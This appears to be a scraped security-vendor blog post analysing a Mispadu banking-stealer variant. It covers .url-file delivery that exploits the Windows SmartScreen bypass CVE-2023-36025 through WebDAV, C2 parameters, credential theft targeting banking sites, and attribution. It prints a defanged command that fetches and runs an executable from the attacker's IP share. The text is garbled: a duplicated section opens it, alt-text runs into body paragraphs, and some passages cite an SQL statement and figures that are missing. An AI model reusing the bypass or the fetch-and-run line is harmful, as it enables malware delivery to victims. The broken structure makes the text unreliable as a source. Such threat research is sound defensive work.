The typical distribution method for Mispadu involves spam campaigns, where victims receive malicious emails containing a .zip file housing a deceptive URL.\r\n\r\nMispadu is multistage malware, containing various techniques that its developers are constantly changing. Over the past year, recent versions have had multiple changes, but some techniques remained similar.\r\n\r\nThis section summarizes the similarities and differences between this malware and other malware targeting Latin America (LATAM).\r\nMarch 2023\r\nThe new malware\u2019s C2 traffic heavily aligns with the Mispadu campaign that MetabaseQ previously discussed in March 2023. In our analysis, we also identified a strong similarity within the info-stealing capability, which the developers wrote as an AutoIt script in the earliest samples.\r\n\r\nThe following similarities and differences are notable between the samples:\r\n\r\n \tWhile the C2 servers keep changing, we observed a similar .php file in both campaigns: it.php\r\n \tThe .php file accepts parameters such as system language, system architect and operating system.\r\n \tIn this new sample, we observed the same parameter names being passed to it.php, as in the campaign described in May 2023:\r\n\r\n \tv1: Computer language\r\n \tv2: Keyboard layout (language)\r\n \tv4: Operating system\r\n \tv5: Whether the process is admin or not\r\n \tv6: System architecture\r\n\r\n\r\n\r\nA significant difference we observed between the campaigns is the execution chain and the main payload. While the campaign of May 2023 contained a multistage malware sample with an AutoIt script main payload, the newest sample is an executable that contains the same info-stealing functionality as the former AutoIt script.\r\n\r\nAs mentioned above, the info-stealing technique in both samples seems to be similar in the following ways:\r\n\r\n \tBoth use SQLite to read stored credentials. This is a legitimate library that other infostealers also use.\r\n \tPrevious samples of Mispadu used known tools such as WebBrowserPassView and Mail PassView for credential extraction. However, we suspect that the authors changed this method to use SQLite to evade detection.\r\n \tWhile they won\u2019t extract all credentials, both samples are targeting specific banking websites.\r\n \tBoth samples use Bcrypt.dll and AES encryption.\r\n\r\nAugust 2023\r\nWe observed additional similarities between the payload shown below in Figure 8 and the payload from a Mexican campaign shown below in Figure 9 that Team Axon reported on in August 2023.\r\n\r\nUnlike the new samples, the campaign from August 2023 implements its info-stealing capability using PowerShell code. On top of that functionality, samples from this campaign have additional capabilities not observed in the current case, such as the installation of malicious Chrome extensions. However, in this case the common ground between this campaign and our new sample is the initial delivery via .url files.\r\n\r\nAdditionally, the campaign in August 2023 also leveraged the WebDAV feature for execution. While the .url file pointed to a .jse file, the new variant used a .url file that pointed to an executable file (.exe).\r\n\r\n[caption id=\"attachment_132287\" align=\"aligncenter\" width=\"573\"] Figure 8. <h2><strong>Mispadu Stealer Background</strong></h2>
<p>Mispadu Stealer is a known and stealthy banking Trojan first <a href="https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/" target="_blank" rel="noopener">reported by ESET in November 2019</a>. Written in Delphi, it originally targeted victims in Brazil and Mexico.</p>
<p>We discovered samples we strongly attribute to the Mispadu Stealer after the recent publication of the Windows SmartScreen bypass vulnerability identified as <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36025" target="_blank" rel="noopener">CVE-2023-36025</a>. While hunting for bypass attempts, we identified a new variant of Mispadu that was created and executed before the CVE publication, which was potentially not intended to bypass this feature.</p>
<h3><a id="post-132267-_l7xgqseran8u"></a>SmartScreen Vulnerability CVE-2023-36025</h3>
<p>CVE-2023-36025 is categorized as a security feature bypass vulnerability within the Windows SmartScreen function. SmartScreen is designed to protect users from untrusted sources by warning them about potentially harmful websites and files.</p>
<p>An example of a SmartScreen warning is shown below in Figure 1. However, attackers can bypass these warnings by exploiting CVE-2023-36025.</p>
<figure id="attachment_132273" aria-describedby="caption-attachment-132273" style="width: 400px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-132273" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/02/word-image-132267-1.png" alt="Image 1 is a screenshot of Microsoft Defender SmartScreen. Windows protected your PC. Microsoft Defender SmartScreen prevented an unrecognized app from starting. Running this app might put your PC at risk. Link for more info. Button: Don't run." width="400" height="377" /><figcaption id="caption-attachment-132273" class="wp-caption-text">Figure 1. Windows SmartScreen warning.</figcaption></figure>
<p>This exploit revolves around the creation of a specifically crafted internet shortcut file (<span style="font-family: 'courier new', courier, monospace;">.url</span>) or a hyperlink pointing to malicious files that can bypass SmartScreen’s warnings.</p>
<p>The bypass is simple and relies on a parameter that references a network share, rather than a URL. The crafted <span style="font-family: 'courier new', courier, monospace;">.url</span> file contains a link to a threat actor’s network share with a malicious binary as shown below in Figure 2.</p>
<p>Using this crafted <span style="font-family: 'courier new', courier, monospace;">.url</span> file, Windows will not display SmartScreen’s warning message. Upon clicking the <span style="font-family: 'courier new', courier, monospace;">.url</span> file, the victim is redirected to the threat actor’s network share to retrieve and execute the malicious payload.</p>
<figure id="attachment_132275" aria-describedby="caption-attachment-132275" style="width: 500px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-132275" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/02/word-image-132267-2.png" alt="Image 2 is a screenshot of the code that bypasses SmartScreen’s warning to run proc.exe." width="500" height="105" /><figcaption id="caption-attachment-132275" class="wp-caption-text">Figure 2. Crafted <span style="font-family: 'courier new', courier, monospace;">.url</span> file that runs <span style="font-family: 'courier new', courier, monospace;">proc.exe</span> without SmartScreen’s warning.</figcaption></figure>
<h2><a id="post-132267-_fxlpi3lm4yu0"></a><strong>SmartScreen Attack Explained</strong></h2>
<p>In November 2023, while hunting for attempts to bypass SmartScreen by searching for binaries executed from a network share, we observed a <span style="font-family: 'courier new', courier, monospace;">.url</span> file at the following file path:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">C:\Users\&lt;USER&gt;\AppData\Local\Temp\4af8a553-b773-4448-b256-17329eb35676_RFC.Online.[redacted].1981.d9f.zip.676\[redacted].[redacted].1209.url</span></li>
</ul>
<p>The contents of this URL file are shown below in Figure 3.</p>
<figure id="attachment_132277" aria-describedby="caption-attachment-132277" style="width: 600px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-132277" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/02/word-image-132267-3.png" alt="Image 3 is a screenshot of the contents of a URL with crafted content. " width="600" height="203" /><figcaption id="caption-attachment-132277" class="wp-caption-text">Figure 3. Crafted <span style="font-family: 'courier new', courier, monospace;">.url</span> file content.</figcaption></figure>
<p>This <span style="font-family: 'courier new', courier, monospace;">.url</span> file executed the following command to retrieve and execute a malicious binary named <span style="font-family: 'courier new', courier, monospace;">2456719228.exe</span>:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">file[:]\\24.199.98[.]128@80\expediente38\1477606991\2456719228.exe</span></li>
</ul>
<p>The malicious <span style="font-family: 'courier new', courier, monospace;">.url</span> file was originally contained in a <span style="font-family: 'courier new', courier, monospace;">.zip</span> archive that was downloaded by the Microsoft Edge browser:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">C:\Users\&lt;USER&gt;\Downloads\RFC.Online.[redacted].1981.d9f.zip</span></li>
</ul>
<p>These types of ZIP archives can be distributed as email attachments or as downloads from malicious websites. Based on the filename pattern of this ZIP example, we believe the threat actor likely distributed it as an email attachment.</p>
<p>Upon further investigation, we identified similar payloads downloaded from the same command and control (C2). These binaries were all compiled and executed before publication of the SmartScreen bypass. This helped us identify that the <a href="https://en.wikipedia.org/wiki/WebDAV" target="_blank" rel="noopener">WebDAV</a> client was intended to execute those files.</p>
<p>Navigating a UNC path in a <span style="font-family: 'courier new', courier, monospace;">.url</span> file prompts the system to use the protocol based on network shares. While SMB is typically the default, the system would attempt to use WebDAV if SMB is not enabled. In such scenarios, the operating system will initiate a request through the <span style="font-family: 'courier new', courier, monospace;">rundll32.exe</span> utility, as shown in Figure 4.</p>
<figure id="attachment_132279" aria-describedby="caption-attachment-132279" style="width: 600px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-132279" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/02/word-image-132267-4.png" alt="Image 4 is a screenshot of a Rundll32 command utilizing WebDAV. " width="600" height="53" /><figcaption id="caption-attachment-132279" class="wp-caption-text">Figure 4. <span style="font-family: 'courier new', courier, monospace;">Rundll32</span> command intended to utilize the WebDAV client.</figcaption></figure>
<p>Notably, specifying an HTTP port (<span style="font-family: 'courier new', courier, monospace;">@80</span>) within the UNC path compels Windows to leverage WebDAV over HTTP instead of SMB. This method is not limited to Mispadu Stealer. A different stealer described in a <a href="https://www.hunters.security/en/blog/dissecting-new-infostealer-campaign-targeting-mexico" target="_blank" rel="noopener">report by Team Axon</a> has also used this technique.</p>
<p>While diving into our newly discovered samples, we found a strong connection to the Mispadu Stealer that appears to have evolved its techniques in recent years. To explore this evolution, we analyzed one of these new malware samples.</p>
<h2><a id="post-132267-_b93nsx7moqvd"></a><br />
<strong>Sample Analysis</strong></h2>
<p>Through this research, we ultimately discovered a number of historical samples aligning to the Mispadu Stealer malware family. <p>The malware identifies the <span style="font-family: 'courier new', courier, monospace;">%TEMP%</span> directory on the victim host, which it will use for temporary file storage during the remainder of its execution. After it performs this action, the malware identifies the version of Windows the victim host is running and performs its initial HTTP/HTTPS check-in to the remote C2 server.</p>
<p>The malware will perform either an <span style="font-family: 'courier new', courier, monospace;">HTTP</span> or <span style="font-family: 'courier new', courier, monospace;">HTTPS GET</span> request based on the version of Microsoft Windows the host is running. In the event that the victim machine is running Windows 7 or older, the malware will perform an <span style="font-family: 'courier new', courier, monospace;">HTTP</span> request. Otherwise, the malware will perform an <span style="font-family: 'courier new', courier, monospace;">HTTPS</span> request. Figure 5 shows what this request looks like.</p>

<p>Note that in the SQL statement above, <span style="font-family: 'courier new', courier, monospace;">13337916118295160</span> is a Unix timestamp that aligns to a date of Aug. 29, 2023. By executing the SQL statement, the malware is looking at observed URLs the victim navigated to on Microsoft Edge or Google Chrome after that date. This provides additional information about the age of these attacks and how long they’ve been taking place.</p>
<p>The malware then checks the extracted URLs against a targeted list. To build a list of URLs the attackers are interested in, the malware leverages a prebuilt list of SHA256 hashes. The malware makes these hashes from the URLs after splitting them by the “<span style="font-family: 'courier new', courier, monospace;">.</span>” character. The malware also prepends the <span style="font-family: 'courier new', courier, monospace;">0x23155CA4D7D94B1E511228924940CAD2A19F801DDC8A445A819C1F9FD1B10226</span> hash to the data that it’s hashing. This prevents researchers and analysts from brute-forcing or otherwise searching the internet for the hashes it uses.</p>

<h2><a id="post-132267-_pcy586tznfb3"></a><strong>Attribution</strong></h2>
<p>The C2 infrastructure and info-stealing functionality discovered in this sample are similar to the ones used by a Mispadu AutoIt sample from May 2023. This information helped form our assumption that the recently compiled binaries are a new version of the Mispadu Stealer previously reported by <a href="https://www.metabaseq.com/mispadu-banking-trojan/" target="_blank" rel="noopener">MetabaseQ</a>.</p>
<p>We also found a connection between this sample and another Mexican infostealer campaign.</p>
<h3><a id="post-132267-_kcrmsdebfb04"></a>Mispadu Stealer</h3>
<p>Mispadu is notorious information-stealing malware first identified in 2019, which specifically targets Spanish- and Portuguese-speaking victims. The typical distribution method for Mispadu involves spam campaigns, where victims receive malicious emails containing a <span style="font-family: 'courier new', courier, monospace;">.zip</span> file housing a deceptive URL.</p>
<p>Mispadu is multistage malware, containing various techniques that its developers are constantly changing. Over the past year, recent versions have had multiple changes, but some techniques remained similar.</p>
<p>This section summarizes the similarities and differences between this malware and other malware targeting Latin America (LATAM).</p>
<h4><a id="post-132267-_er32ououivdf"></a>March 2023</h4>
<p>The new malware’s C2 traffic heavily aligns with the Mispadu campaign that <a href="https://www.metabaseq.com/mispadu-banking-trojan/" target="_blank" rel="noopener">MetabaseQ previously discussed in March 2023</a>. In our analysis, we also identified a strong similarity within the info-stealing capability, which the developers wrote as an AutoIt script in the earliest samples.</p>
<p>The following similarities and differences are notable between the samples:</p>
<ul>
<li>While the C2 servers keep changing, we observed a similar <span style="font-family: 'courier new', courier, monospace;">.php</span> file in both campaigns: <span style="font-family: 'courier new', courier, monospace;">it.php</span></li>
<li>The <span style="font-family: 'courier new', courier, monospace;">.php</span> file accepts parameters such as system language, system architect and operating system.</li>
<li>In this new sample, we observed the same parameter names being passed to <span style="font-family: 'courier new', courier, monospace;">it.php</span>, as in the campaign described in May 2023:
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">v1</span>: Computer language</li>
<li><span style="font-family: 'courier new', courier, monospace;">v2</span>: Keyboard layout (language)</li>
<li><span style="font-family: 'courier new', courier, monospace;">v4</span>: Operating system</li>
<li><span style="font-family: 'courier new', courier, monospace;">v5</span>: Whether the process is admin or not</li>
<li><span style="font-family: 'courier new', courier, monospace;">v6</span>: System architecture</li>
</ul>
</li>
</ul>
<p>A significant difference we observed between the campaigns is the execution chain and the main payload. While the campaign of May 2023 contained a multistage malware sample with an AutoIt script main payload, the newest sample is an executable that contains the same info-stealing functionality as the former AutoIt script.</p>
<p>As mentioned above, the info-stealing technique in both samples seems to be similar in the following ways:</p>
<ul>
<li>Both use SQLite to read stored credentials. This is a legitimate library that other infostealers also use.</li>
<li>Previous samples of Mispadu used known tools such as WebBrowserPassView and Mail PassView for credential extraction. However, we suspect that the authors changed this method to use SQLite to evade detection.</li>
<li>While they won’t extract all credentials, both samples are targeting specific banking websites.</li>
<li>Both samples use <span style="font-family: 'courier new', courier, monospace;">Bcrypt.dll</span> and AES encryption.</li>
</ul>
<h4><a id="post-132267-_slbgww94n7pt"></a>August 2023</h4>
<p>We observed additional similarities between the payload shown below in Figure 8 and the payload from a Mexican campaign shown below in Figure 9 that <a href="https://www.hunters.security/en/blog/dissecting-new-infostealer-campaign-targeting-mexico" target="_blank" rel="noopener">Team Axon reported</a> on in August 2023.</p>
<p>Unlike the new samples, the campaign from August 2023 implements its info-stealing capability using PowerShell code. On top of that functionality, samples from this campaign have additional capabilities not observed in the current case, such as the installation of malicious Chrome extensions. However, in this case the common ground between this campaign and our new sample is the initial delivery via <span style="font-family: 'courier new', courier, monospace;">.url</span> files.</p>
<p>Additionally, the campaign in August 2023 also leveraged the WebDAV feature for execution. While the <span style="font-family: 'courier new', courier, monospace;">.url</span> file pointed to a <span style="font-family: 'courier new', courier, monospace;">.jse</span> file, the new variant used a <span style="font-family: 'courier new', courier, monospace;">.url</span> file that pointed to an executable file (<span style="font-family: 'courier new', courier, monospace;">.exe</span>).</p>
<figure id="attachment_132287" aria-describedby="caption-attachment-132287" style="width: 573px" class="wp-caption aligncenter"><img decoding="async" class="wp-image-132287" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/02/word-image-132267-8.png" alt="Image 8 is a screenshot of many lines of code. <p>Mispadu typically focuses on LATAM countries and Spanish- or Portuguese-speaking users. This particular campaign has been detected across various regions, with Mexico being the most prominent, as noted in Figure 10 below. This campaign is spreading rapidly, reaching other European regions that we haven’t seen targeted in previous campaigns.</p>
<p>Although the malware doesn’t steal credentials from untargeted regions, it’s only a matter of time until the threat authors release the next version of their malware. At that time, the threat might expand its targets.</p>
<figure id="attachment_132339" aria-describedby="caption-attachment-132339" style="width: 700px" class="wp-caption aligncenter"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads//Mispadu-F10-Revised.svg"><img decoding="async" class="wp-image-132339" src="https://unit42.paloaltonetworks.com/wp-content/uploads//Mispadu-F10-Revised.svg" alt="Image 10 is a column graph of the affected countries. <h2><a id="post-132267-_ss3i6byuni8s"></a>Conclusion</h2>
<p>This new Mispadu variant keeps evolving and changing techniques – until it’s almost impossible to attribute it to previous campaigns. However, minor similarities can shed light into the attribution of different samples. These differences mean that a comprehensive and multifaceted approach to cybersecurity becomes critical. This approach includes staying informed on the latest threat intelligence, employing robust endpoint protection and fostering a culture of cybersecurity awareness among users.</p>
